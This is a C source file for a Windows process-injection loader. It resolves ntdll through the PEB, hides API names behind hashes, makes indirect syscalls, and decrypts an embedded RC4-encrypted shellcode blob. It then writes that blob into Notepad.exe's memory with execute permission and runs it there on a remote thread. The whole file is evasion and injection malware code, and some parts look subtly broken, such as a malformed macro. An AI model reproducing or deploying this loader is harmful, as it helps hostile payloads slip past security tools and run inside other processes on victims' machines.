#include "header.h"
#include "structs.h"
#include "peb.h"
#define INTIAL_SEED 7

#ifndef STRUCTS
#include "winternl.h"
#endif // STRUCTS

#define CONTAINING_RECORD(address, type, field) \ ((type *)((PCHAR)(address) - (ULONG PTR)(&((type * )0)->field))




// InDirect Syscalls: DONE
// Custom GetProcAddr: DONE
// Custom GetModuleHandle: DONE
// API/String Hashing: DONE
// RC4 Encryption: DONE
// Find NotePad: NOPE
// Brute Force Key: NOPE

DWORD Fn_OpenProcessSSN;
DWORD Fn_AllocateVirtualMemorySSN;
DWORD Fn_WriteVirtualMemorySSN;
DWORD Fn_CreateThreadExSSN;
DWORD Fn_WaitForSingleObjectSSN;
DWORD Fn_CloseSSN;
UINT_PTR Fn_OpenProcessSyscall;
UINT_PTR Fn_AllocateVirtualMemorySyscall;
UINT_PTR Fn_WriteVirtualMemorySyscall;
UINT_PTR Fn_CreateThreadExSyscall;
UINT_PTR Fn_WaitForSingleObjectSyscall;
UINT_PTR Fn_CloseSyscall;

DWORD open = 0x616bcd2b;
DWORD alloc = 0xb4983c2f;
DWORD write = 0x92a7f011;
DWORD thred = 0x3c2d6449;
DWORD Wait = 0x8541c085;
DWORD Module = 0x82acbbb8;


DWORD JenkinsHash(IN LPCVOID str, BOOL isUnicode) {
	SIZE_T index = 0;
	UINT32 hash = 0;
	SIZE_T Length;

	if (isUnicode) {
		// Calculate length for wide string
		Length = lstrlenW((LPCWSTR)str);
		while (index != Length) {
			hash += ((LPCWSTR)str)[index++];
			hash += hash << INTIAL_SEED;
			hash ^= hash >> 6;
		}
	}
	else {
		// Calculate length for ASCII string
		Length = lstrlenA((LPCSTR)str);
		while (index != Length) {
			hash += ((LPCSTR)str)[index++];
			hash += hash << INTIAL_SEED;
			hash ^= hash >> 6;
		}
	}

	hash += hash << 3;
	hash ^= hash >> 11;
	hash += hash << 15;

	return hash;
}




VOID GetSSN(IN HMODULE hNDLL, IN DWORD hshName, OUT DWORD* SSN, OUT UINT_PTR* SYSCALL) {
	FARPROC CusProc(IN HMODULE ndll, IN DWORD hshed);
	UINT_PTR FuncAddr = NULL;
	BYTE OpCodes[2] = { 0x0F, 0x05 };

	FuncAddr = (UINT_PTR)CusProc(hNDLL, hshName); // Get Address Of Our Function (NtOpenProcess For Example)

	if (FuncAddr == NULL) {
		//warn("Failed Finding Address");
		return NULL;
	}
	//okay("Got Function Addresss\n\\____0x%p", FuncAddr);

	//info("Getting SSN...");
	*SSN = ((PBYTE)(FuncAddr + 4))[0]; // SSN Number is 9/10 Stored 4 bytes From Start
	*SYSCALL = FuncAddr + 0x12;       //  Syscall number Is Stored 12 bytes From Start Of Function

	if (memcmp(OpCodes, *SYSCALL, sizeof(OpCodes)) != 0) { // Compare the Found SysOpcodes To The correct ones
		//warn("OpCodes Did Not Match 0x0F, 0x05");
		return NULL;
	}


	//okay("Got SSN [0x%1x]\n\n", *SSN); // Print SSN Number
}

FARPROC CusProc(IN HMODULE ndll, IN DWORD hshed) {
	// Save The Base Address Of Module
	PBYTE pBase = (PBYTE)ndll;

	// Find The Dos Header And Do a Check
	PIMAGE_DOS_HEADER pImgDos = (PIMAGE_DOS_HEADER)pBase;
	if (pImgDos->e_magic != IMAGE_DOS_SIGNATURE) {
		//printf("Not a Valid Dos header");
		return NULL;
	}

	// Find The NT Header And Do a Check, e_lfanew points to it
	PIMAGE_NT_HEADERS pImgNT = (PIMAGE_NT_HEADERS)(pBase + pImgDos->e_lfanew);
	if (pImgNT->Signature != IMAGE_NT_SIGNATURE) {
		//printf("Not a Valid NT Header");
		return NULL;
	}

	// Get The Option Header Address
	IMAGE_OPTIONAL_HEADER pImgOpt = pImgNT->OptionalHeader;


	PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + pImgOpt.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	// Save The Addresses Of Names, Functions And the Oridnals
	PDWORD FuncNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
	PDWORD FuncAddrArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
	PWORD FuncOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);

	// Loop Through Each Function And Check if it == The Needed Function And If So
	for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {
		CHAR* pFuncName = (CHAR*)(pBase + FuncNameArray[i]); // Name Of Current Function
		DWORD hashed = JenkinsHash(pFuncName, FALSE); // Hash The Current Function Name For comparing Against One we Want

		if (hshed == hashed) {
			// Get and Return The Address Of the Current Function
			PVOID pFuncAddr = (PVOID)(pBase + FuncAddrArray[FuncOrdinalArray[i]]);
			return pFuncAddr;
		}
	}
	return NULL;

}

HMODULE CusMod(IN DWORD Name) {
#ifdef _WIN64
	PPEB pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32
	PPEB pPeb = (PEB*)(__readgsqword(0x30));
#endif
	PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);

	PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InInitializationOrderModuleList.Flink);

	PLIST_ENTRY pListHead = (PLIST_ENTRY)&pPeb->Ldr->InMemoryOrderModuleList;
	// Get The End(node) of the linked list
	PLIST_ENTRY pListNode = (PLIST_ENTRY)pListHead->Flink;

	do {
		// Check If the Lenght Of module != NULL
		if (pDte->FullDllName.Length != NULL) {
			// Hash The Name Of It and then
			DWORD f_hash = JenkinsHash(pDte->FullDllName.Buffer, TRUE);

			// Compare the hash against the Inputted Hash
			if (f_hash == Name) {
#ifdef  STRUCTS
				// Return The Address Of the Correct Module
				return (HMODULE)(pDte->InInitializationOrderLinks.Flink);
#else
				// This one is only Needed If we Arent Using the Current Technique, other one broke my code tho
				return (HMODULE)pDte->Reserved2[0];
#endif //  STRUCTS

			}

			// Point to The Next entry In Linked List
			pDte = (PLDR_DATA_TABLE_ENTRY)(pListNode->Flink);

			// Update the end(node) to be the next end(node)
			pListNode = (PLIST_ENTRY)(pListNode->Flink);
		}
	} while (pListNode != pListHead); // Loop While There are still elemants in the linked list

	return NULL;
}
BOOL Rc4EncryptionSystemFunction(IN PBYTE pRc4Key, IN PBYTE pShellcode, IN DWORD dwRc4KeySize, IN DWORD sShellSize) {
	NTSTATUS STATUS = NULL;


	// Make to USTRING  Varibales
	// One is passed as Key and Other Passed As Payload to encrypt/decrypt
	USTRING key = { .Buffer = pRc4Key, .Length = dwRc4KeySize, .MaximumLength = dwRc4KeySize },
		data = { .Buffer = pShellcode, .Length = sShellSize, .MaximumLength = sShellSize };

	// Load Needed DLL since SystemFunction32 Is Exported From it
	fnSystemFunction032 pSystemFunction32 = (fnSystemFunction032)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");
	if ((STATUS = pSystemFunction32(&data, &key)) != 0x0) {
		return FALSE;
	}
	return TRUE;
}

BOOL GetInfo(IN LPCWSTR Name, IN HMODULE hNdll, OUT DWORD* pID) {
	ULONG uReturn1;
	ULONG uReturn2;
	PSYSTEM_PROCESS_INFORMATION zsProcInfo = NULL;
	PVOID ValueToFree = NULL;
	DWORD query = 0xc91abebe;  // Hash Of NtQuerySystemInformation
	NTSTATUS status = NULL;

	_func_NtQuerySystemInformation pQuery = (_func_NtQuerySystemInformation)CusProc(hNdll, query);

	pQuery(SystemProcessInformation, NULL, NULL, &uReturn1);

	zsProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturn1);
	if (zsProcInfo == NULL) {
		return FALSE;
	}
	ValueToFree = zsProcInfo;
	status = pQuery(SystemProcessInformation, zsProcInfo, uReturn1, &uReturn2);
	if (status != STATUS_SUCCESS) {
		return FALSE;
	}

	while (TRUE) {
		if (zsProcInfo->ImageName.Length != NULL && wcscmp(zsProcInfo->ImageName.Buffer, Name) == 0) {
			*pID = zsProcInfo->UniqueProcessId;
			break;
		}

		if (!zsProcInfo->NextEntryOffset) {
			break;
		}
		zsProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)zsProcInfo + zsProcInfo->NextEntryOffset);
	}
	HeapFree(GetProcessHeap(), 0, ValueToFree);
	if (*pID == NULL) {
		return FALSE;
	}
	return TRUE;


}


unsigned char code[] =
"\xbc\x2f\xb5\xf2\xe1\xe2\x97\x2f\xaf\xef\x1a\xf8\x35\x7f"
"\xd1\x60\x9d\xd3\x98\x69\x79\xf5\x4d\x9a\x74\x13\x36\xa8"
"\xfb\xa4\x7c\x98\x75\x4e\xb4\xad\xa7\xe9\x46\x7d\x5c\xd3"
"\xe2\xbe\x99\xc8\x87\x6d\x88\xfb\x76\x1a\x2c\xab\x73\x42"
"\x90\x78\x6e\xa1\xef\x11\x29\xcb\x4a\x47\xcc\x86\xb5\x66"
"\xb6\x20\xf8\xbc\x90\xb8\x51\xc2\x5f\x8d\x9d\x35\xf5\x6f"
"\xa8\x2a\xa4\x20\x12\x97\x2c\x4f\xea\xc5\x8c\x6c\xe2\xda"
"\xd7\x50\x88\x42\xc6\xc4\x37\xb9\xfb\x31\x54\x50\xf3\xa0"
"\xff\x44\xd0\xe0\xc1\xfb\x02\xfb\x1e\x13\x4d\xeb\x56\x1f"
"\xdf\xf2\xda\x39\xa7\xc7\xf0\x96\x45\xc6\x6a\xe5\x78\xcf"
"\x21\x70\x23\xf1\x02\x25\x4a\x30\x38\xd8\x0c\x81\xd8\x88"
"\xaa\x99\x27\x71\x71\xe5\x33\xb1\xdf\xcb\xf4\x35\xc2\x8c"
"\xb2\x17\x66\xe3\xe2\xc0\x3e\xf4\x1a\x6a\xaa\xf5\xb1\x96"
"\x0e\x88\xe3\x3a\x60\x5c\x1d\x2b\xd5\x57\xac\x24\x1a\xb4"
"\xae\x4c\x45\x2f\x0c\x75\x10\xc8\xd1\x34\x21\x5b\x96\x19"
"\xbe\x0d\xe1\x78\x84\x94\x68\xd3\xf1\xa2\xe5\x1b\xcc\xd1"
"\x6c\x01\x95\x87\x66\xaa\xe2\x34\xab\x3b\x6c\xbe\xd5\x80"
"\x08\x03\x19\x97\x2e\xc8\xf1\x88\xa8\xb4\xb9\xb4\x3f\x8a"
"\x5e\x08\xa3\x3a\xbf\xdf\xbf\xe1\x46\xdb\xef\x24\x00\x55"
"\x33\x83\xf0\x7e\xf5\x92\x15\xe5\x4d\xfd\x08\x57\x42\x89"
"\x7d\x8d\xa6\x41\x25\xa8\x7b\x6a\x74\x35\x72\xf2\xa1\x48"
"\x40\xf5\xaa\x36\x59\x9c\x27\x1f\xb5\xb7\xf9\x94\xa8\xa8"
"\x2b\x58\x24\xaf\x43\x77\xc3\x28\x01\x72\x84\xec\xae\x74"
"\xa9\x4f\x80\xd4\x7d\x8c\x89\x89\x1b\xd5\x83\x99\xe0\x7d"
"\x5e\x61\x01\xab\x37\x5e\xf0\x5e\x2c\x60\xaa\x3e\x77\xb1"
"\xaa\xb1\x2c\x54\x1d\x46\x2c\xd9\xee\xe0\x7f\xfd\xc2\x20"
"\x31\xd4\x97\x80\xab\x59\x74\x42\xcf\xfb\x21\x4d\x5d\x81"
"\x02\xd0\x27\xf5\x4c\x66\x57\xd4\x55\x63\xc9\x3c\x4e\x82"
"\x48\x5e\xf9\xd1\x1d\xff\x14\xbd\x9a\xc8\xa4\x88\x5c\x13"
"\x97\x89\x8b\xd4\x34\x58\x1d\xce\xd0\x83\xc5\x01\x66\xa5"
"\x9a\x3e\x39\xed\x3a\x5d\xf5\x50\x6b\xcf\xa7\x48\xeb\xfc"
"\x91\xd1\x71\x39\x5c\xad\x7f\x29\x9d\xfd\x3f\x68\x24\x63"
"\x39\xfd\xdf\x59\x5d\x48\x2c\x05\x3b\x9b\xac\xb8\x91";

unsigned char key[] = {
	0x4A, 0xF6, 0x2E, 0x83, 0x97, 0x5B, 0xA1, 0x3D, 0x70, 0xE9,
	0x1C, 0xB2, 0x5F, 0x8D, 0x62
};


int main(int argc, char* argv[]) {
	HANDLE hProcHandle = NULL;
	HANDLE hThreadHandle = NULL;
	DWORD pID = NULL;
	PVOID rBuffer = NULL;
	HMODULE hNTDLL = CusMod(Module);

	if (!GetInfo(L"Notepad.exe", hNTDLL, &pID)) {
		return EXIT_FAILURE;
	}
	



	OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };
	CLIENT_ID CID = { (HANDLE)pID, NULL };
	


	size_t c_size = sizeof(code);

	if (!Rc4EncryptionSystemFunction(key, code, sizeof(key), c_size)) {
		return 1;
	}



	//info("Setting Up...\n");
	GetSSN(hNTDLL, open, &Fn_OpenProcessSSN, &Fn_OpenProcessSyscall);

	NTSTATUS status = POpenProcess(&hProcHandle, PROCESS_ALL_ACCESS, &OA, &CID);
	if (status != STATUS_SUCCESS) {
		//warn("Failed Opening");
		return EXIT_FAILURE;
	}
	//printf("[%ld] HANDLE: 0x%p\n\n", pID, hProcHandle);

	GetSSN(hNTDLL, alloc, &Fn_AllocateVirtualMemorySSN, &Fn_AllocateVirtualMemorySyscall);
	status = PAllocateVirtualMemory(hProcHandle, &rBuffer, 0, &c_size, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	if (status != STATUS_SUCCESS) {
		//warn("Alloc Failed");
		return EXIT_FAILURE;
	}
	//printf("Allocted %d-Bytes [RWX]\n\n", c_size);


	GetSSN(hNTDLL, write, &Fn_WriteVirtualMemorySSN, &Fn_WriteVirtualMemorySyscall);
	status = PWriteVirtualMemory(hProcHandle, rBuffer, code, c_size, NULL);
	if (status != STATUS_SUCCESS) {
		//warn("write failed");
		return EXIT_FAILURE;
	}
	//okay("Wrote Into Buffer");

	GetSSN(hNTDLL, thred, &Fn_CreateThreadExSSN, &Fn_CreateThreadExSyscall);
	status = PCreateThreadEx(&hThreadHandle, THREAD_ALL_ACCESS, &OA, hProcHandle, (PTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, 0, 0, NULL);
	if (status != STATUS_SUCCESS) {
		//warn("thread fail");
		return EXIT_FAILURE;
	}

	WaitForSingleObject(hThreadHandle, INFINITE);

	CloseHandle(hProcHandle);
	CloseHandle(hThreadHandle);


	return EXIT_SUCCESS;
}
